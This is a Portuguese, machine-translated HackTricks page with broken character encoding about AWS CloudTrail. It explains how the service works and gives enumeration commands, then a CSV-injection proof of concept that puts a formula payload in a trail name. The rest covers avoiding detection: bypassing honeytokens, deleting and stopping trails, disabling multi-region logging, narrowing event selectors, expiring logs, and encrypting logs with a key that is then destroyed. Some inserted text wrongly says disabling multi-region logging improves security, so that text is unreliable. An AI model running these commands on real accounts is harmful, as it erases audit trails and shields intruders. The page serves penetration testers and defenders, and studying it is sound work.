# AWS - Enumera√ß√£o do CloudTrail

<details>

<summary><strong>Apoie o HackTricks e obtenha benef√≠cios!</strong></summary>

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou se deseja acessar a **vers√£o mais recente do PEASS ou baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Obtenha o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) no github.

</details>

## **CloudTrail**

Este servi√ßo **rastreia e monitora as chamadas de API da AWS feitas dentro do ambiente**. Cada chamada para uma API (evento) √© registrada. Cada evento registrado cont√©m:

* O nome da API chamada: `eventName`
* O servi√ßo chamado: `eventSource`
* O hor√°rio: `eventTime`
* O endere√ßo IP: `SourceIPAddress`
* O m√©todo do agente: `userAgent`. Exemplos:
* Signing.amazonaws.com - Do Console de Gerenciamento da AWS
* console.amazonaws.com - Usu√°rio raiz da conta
* lambda.amazonaws.com - AWS Lambda
* Os par√¢metros da solicita√ß√£o: `requestParameters`
* Os elementos de resposta: `responseElements`

Os eventos s√£o gravados em um novo arquivo de log **aproximadamente a cada 5 minutos em um arquivo JSON**, eles s√£o mantidos pelo CloudTrail e, finalmente, os arquivos de log s√£o **entregues ao S3 aproximadamente 15 minutos depois**.\
Os logs do CloudTrail podem ser **agregados em v√°rias contas e regi√µes**.\
O CloudTrail permite usar **integridade de arquivo de log para poder verificar se seus arquivos de log permaneceram inalterados** desde que o CloudTrail os entregou para voc√™. Ele cria um hash SHA-256 dos logs dentro de um arquivo de resumo. Um hash sha-256 dos novos logs √© criado a cada hora.\
Ao criar um Trail, os seletores de evento permitir√£o indicar o trail para registrar: eventos de gerenciamento, dados ou insights.

Os logs s√£o salvos em um bucket S3. Por padr√£o, √© usada a criptografia do lado do servidor (SSE-S3), para que a AWS descriptografe o conte√∫do para as pessoas que t√™m acesso a ele, mas para seguran√ßa adicional, voc√™ pode usar SSE com KMS e suas pr√≥prias chaves.

### Conven√ß√£o de Nomenclatura de Arquivos de Log

![](<../../../../.gitbook/assets/image (29).png>)

### Estrutura de pastas do S3

![](<../../../../.gitbook/assets/image (47).png>)

Observe que as pastas "_AWSLogs_" e "_CloudTrail_" s√£o nomes de pastas fixos,

Os arquivos **Digest** t√™m um caminho de pastas semelhante:

![](<../../../../.gitbook/assets/image (22).png>)

### Agregar Logs de M√∫ltiplas Contas

* Crie um Trail na conta da AWS onde voc√™ deseja que os arquivos de log sejam entregues
* Aplique permiss√µes ao bucket S3 de destino permitindo acesso entre contas para o CloudTrail e permita cada conta da AWS que precisa de acesso
* Crie um novo Trail nas outras contas da AWS e selecione usar o bucket criado no passo 1

No entanto, mesmo que voc√™ possa salvar todos os logs no mesmo bucket S3, voc√™ n√£o pode agregar logs do CloudTrail de v√°rias contas em um CloudWatch Logs pertencente a uma √∫nica conta da AWS

### Cloudtrail de todas as contas da organiza√ß√£o em 1

Ao criar um CloudTrail, √© poss√≠vel indicar para ativar o cloudtrail para todas as contas na organiza√ß√£o e obter os logs em apenas 1 bucket:

<figure><img src="../../../../.gitbook/assets/image (1) (1) (5).png" alt=""><figcaption></figcaption></figure>

Dessa forma, voc√™ pode configurar facilmente o CloudTrail em todas as regi√µes de todas as contas e centralizar os logs em 1 conta (que voc√™ deve proteger).

### Verifica√ß√£o de Arquivos de Log

Voc√™ pode verificar se os logs n√£o foram alterados executando
```javascript
aws cloudtrail validate-logs --trail-arn <trailARN> --start-time <start-time> [--end-time <end-time>] [--s3-bucket <bucket-name>] [--s3-prefix <prefix>] [--verbose]
```
### Registros para o CloudWatch

**O CloudTrail pode enviar automaticamente registros para o CloudWatch para que voc√™ possa configurar alertas que o avisem quando atividades suspeitas forem realizadas.**\
Observe que, para permitir que o CloudTrail envie os registros para o CloudWatch, √© necess√°rio criar uma **fun√ß√£o** que permita essa a√ß√£o. Se poss√≠vel, √© recomendado usar a fun√ß√£o padr√£o da AWS para realizar essas a√ß√µes. Essa fun√ß√£o permitir√° que o CloudTrail:

* CreateLogStream: Isso permite criar fluxos de registro de logs do CloudWatch
* PutLogEvents: Entregar logs do CloudTrail para fluxos de registro de logs do CloudWatch

### Hist√≥rico de Eventos

O Hist√≥rico de Eventos do CloudTrail permite que voc√™ inspecione em uma tabela os registros que foram registrados:

![](<../../../../.gitbook/assets/image (24).png>)

### Insights

**O CloudTrail Insights** analisa automaticamente eventos de gerenciamento de grava√ß√£o de trilhas do CloudTrail e **alerta** voc√™ sobre atividades **incomuns**. Por exemplo, se houver um aumento nos eventos `TerminateInstance` que difere das linhas de base estabelecidas, voc√™ ver√° isso como um evento de Insight. Esses eventos tornam **mais f√°cil encontrar e responder a atividades de API incomuns** do que nunca.

### Seguran√ßa

| Integridade do Arquivo de Log do CloudTrail | <ul><li>Validar se os logs foram adulterados (modificados ou exclu√≠dos)</li><li><p>Usa arquivos de resumo (cria um hash para cada arquivo)</p><ul><li>Hash SHA-256</li><li>SHA-256 com RSA para assinatura digital</li><li>chave privada de propriedade da Amazon</li></ul></li><li>Leva 1 hora para criar um arquivo de resumo (feito a cada hora)</li></ul> |
| ------------------------------------------ | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Impedir acesso n√£o autorizado              | <ul><li><p>Use pol√≠ticas IAM e pol√≠ticas de bucket S3</p><ul><li>equipe de seguran√ßa -> acesso de administrador</li><li>auditores -> acesso somente leitura</li></ul></li><li>Use SSE-S3/SSE-KMS para criptografar os logs</li></ul>                                                                                                                                                   |
| Impedir exclus√£o de arquivos de log         | <ul><li>Restrinja o acesso √† exclus√£o com pol√≠ticas IAM e de bucket</li><li>Configure a exclus√£o do S3 MFA</li><li>Valide com a Valida√ß√£o do Arquivo de Log</li></ul>                                                                                                                                                                                                      |

## A√ß√µes

### Enumera√ß√£o
```bash
# Get trails info
aws cloudtrail list-trails
aws cloudtrail describe-trails
aws cloudtrail list-public-keys
aws cloudtrail get-event-selectors --trail-name <trail_name>
aws [--region us-east-1] cloudtrail get-trail-status --name [default]

# Get insights
aws cloudtrail get-insight-selectors --trail-name <trail_name>

# Get data store info
aws cloudtrail list-event-data-stores
aws cloudtrail list-queries --event-data-store <data-source>
aws cloudtrail get-query-results --event-data-store <data-source> --query-id <id>
```
### **Inje√ß√£o de CSV**

√â poss√≠vel realizar uma inje√ß√£o de CSV dentro do CloudTrail que executar√° c√≥digo arbitr√°rio se os logs forem exportados em CSV e abertos com o Excel.\
O c√≥digo a seguir gerar√° uma entrada de log com um nome de Trail ruim contendo a carga √∫til:
```python
import boto3
payload = "=cmd|'/C calc'|''"
client = boto3.client('cloudtrail')
response = client.create_trail(
Name=payload,
S3BucketName="random"
)
print(response)
```
Para obter mais informa√ß√µes sobre Inje√ß√µes de CSV, consulte a p√°gina:

{% embed url="https://book.hacktricks.xyz/pentesting-web/formula-injection" %}

Para obter mais informa√ß√µes sobre essa t√©cnica espec√≠fica, consulte [https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/](https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/)

## **Evitar Detec√ß√£o**

### HoneyTokens **bypass**

HoneyTokens s√£o criados para **detectar a exfiltra√ß√£o de informa√ß√µes sens√≠veis**. No caso da AWS, eles s√£o **chaves da AWS cujo uso √© monitorado**, se algo disparar uma a√ß√£o com essa chave, algu√©m deve ter roubado essa chave.

No entanto, essa monitoriza√ß√£o √© feita por meio do **CloudTrail**, e existem alguns **servi√ßos da AWS que n√£o enviam logs para o CloudTrail** (encontre a [lista aqui](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-unsupported-aws-services.html)). Alguns desses servi√ßos ir√£o **responder** com um **erro** contendo o **ARN da fun√ß√£o da chave** se algu√©m n√£o autorizado (a chave honeytoken) tentar acess√°-la.

Dessa forma, um **atacante pode obter o ARN da chave sem disparar nenhum log**. No ARN, o atacante pode ver o **ID e o nome da conta da AWS**, √© f√°cil saber os IDs e nomes das contas das Honeytokens, dessa forma um atacante pode identificar se o token √© uma honeytoken.

![](<../../../../.gitbook/assets/image (65).png>)

[**Este script**](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-unsupported-aws-services.html) ou [**Pacu**](https://github.com/RhinoSecurityLabs/pacu) detecta se uma chave pertence a **Canarytokens** ou **SpaceCrab**.

{% hint style="danger" %}
A API usada no Pacu e no script **foi bloqueada**, ent√£o voc√™ precisa **encontrar uma nova**.\
Para encontrar uma nova, voc√™ pode gerar um token canary em [https://canarytokens.org/generate](https://canarytokens.org/generate)
{% endhint %}

Para obter mais informa√ß√µes, consulte a [**pesquisa original**](https://rhinosecuritylabs.com/aws/aws-iam-enumeration-2-0-bypassing-cloudtrail-logging/).

### Excluir trilhas
```bash
aws cloudtrail delete-trail --name [trail-name]
```
### Parar trilhas

Para parar uma trilha do AWS CloudTrail, voc√™ pode usar a interface de linha de comando (CLI) da AWS ou a AWS Management Console.

#### Usando a CLI da AWS

1. Abra o terminal e execute o seguinte comando para parar uma trilha espec√≠fica:

```
aws cloudtrail stop-logging --name <nome-da-trilha>
```

Substitua `<nome-da-trilha>` pelo nome da trilha que voc√™ deseja parar.

#### Usando a AWS Management Console

1. Fa√ßa login na AWS Management Console e abra o servi√ßo do AWS CloudTrail.
2. Na p√°gina inicial do CloudTrail, clique em "Trails" no painel de navega√ß√£o esquerdo.
3. Selecione a trilha que voc√™ deseja parar.
4. Clique no bot√£o "Stop logging" no canto superior direito da p√°gina.
5. Confirme a a√ß√£o clicando em "Stop logging" na caixa de di√°logo de confirma√ß√£o.

A trilha selecionada ser√° interrompida e n√£o registrar√° mais eventos.
```bash
aws cloudtrail stop-logging --name [trail-name]
```
### Desativar o registro em v√°rias regi√µes

Para melhorar a seguran√ßa e reduzir o risco de vazamento de dados, √© recomendado desativar o registro em v√°rias regi√µes no AWS CloudTrail. Ao desativar essa configura√ß√£o, voc√™ evita que os logs sejam armazenados em v√°rias regi√µes, o que pode facilitar o acesso n√£o autorizado aos dados.

Para desativar o registro em v√°rias regi√µes, siga as etapas abaixo:

1. Fa√ßa login no Console de Gerenciamento da AWS.
2. Navegue at√© o servi√ßo AWS CloudTrail.
3. Selecione a trilha de auditoria que deseja modificar.
4. Clique em "Editar" para editar as configura√ß√µes da trilha.
5. Role para baixo at√© a se√ß√£o "Configura√ß√µes de registro".
6. Desmarque a op√ß√£o "Habilitar registro em v√°rias regi√µes".
7. Clique em "Salvar" para aplicar as altera√ß√µes.

Ap√≥s desativar o registro em v√°rias regi√µes, os logs do CloudTrail ser√£o armazenados apenas na regi√£o em que a trilha de auditoria foi criada. Isso ajuda a manter um controle mais seguro e centralizado dos registros de atividades da sua conta AWS.
```bash
aws cloudtrail update-trail --name [trail-name] --no-is-multi-region --no-include-global-services
```
### Desativar o registro por meio de seletores de eventos

{% code overflow="wrap" %}
```bash
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[{"ReadWriteType": "ReadOnly"}]' --region <region>
```
{% endcode %}

Neste exemplo, um √∫nico seletor de evento √© fornecido como um array JSON com um √∫nico objeto. O `"ReadWriteType": "ReadOnly"` indica que o seletor de evento deve capturar apenas eventos de leitura. Voc√™ pode personalizar o seletor de evento com base em seus requisitos espec√≠ficos.

### Exclus√£o de logs via pol√≠tica de ciclo de vida do S3

{% code overflow="wrap" %}
```bash
aws s3api put-bucket-lifecycle --bucket <bucket_name> --lifecycle-configuration '{"Rules": [{"Status": "Enabled", "Prefix": "", "Expiration": {"Days": 7}}]}' --region <region>
```
{% endcode %}

### Modifica√ß√£o do Bucket

* Excluir o bucket S3
* Alterar a pol√≠tica do bucket para negar qualquer grava√ß√£o do servi√ßo CloudTrail
* Adicionar uma pol√≠tica de ciclo de vida ao bucket S3 para excluir objetos
* Desativar a chave KMS usada para criptografar os logs do CloudTrail

### "Ransomware" do CloudTrail

Voc√™ poderia **gerar uma chave assim√©trica** e fazer com que o **CloudTrail criptografe os dados** com essa chave e **excluir a chave privada** para que o conte√∫do do CloudTrail n√£o possa ser recuperado.

![](https://lh6.googleusercontent.com/DRckYJKCAVyDeUY6cganqHTcfvlRMrOcnInUx25f9s9rstNvvkXbu-OS2ZozMvh0Oqxdc9Ehrsc8QJTVGZkbDih\_zsjU2KRvHVGahLqbfAhnD0VLdk096xPNJuAebOJYtDZ71SlnJt6rQj0\_3Q)

![](https://lh3.googleusercontent.com/GfGI0jCdTe2S2HNVMKdNaltBfv9ls6lZqSQt1FkR8mgcxKNdvVmAE2vl77Sr23KWJ6X7-X4UJVgkN5KsQxYEdqOTIWwjr6DHCK9s\_iw5whQkN\_TVPOycc2qHZUSU9NED\_k2lEYK4SpavbTxZ6w)

![](https://lh5.googleusercontent.com/Y9iLLB5RtmBoBVrLE9GKkGK6mxGWtAL6oSwVxgwqYxYHkXpimUZJmAT\_AkxQW-hpdz2kaHpaqXXHwvzz3osg-JA5i1c8\_bWoz5HlTj0mup0MAvG6B5IAnnsnvIDtpqflW4UzIOKZYDxxdxUSDQ)

## **Refer√™ncias**

* [https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory](https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory)

<details>

<summary><strong>Apoie o HackTricks e obtenha benef√≠cios!</strong></summary>

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou se quiser acessar a **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github.

</details>
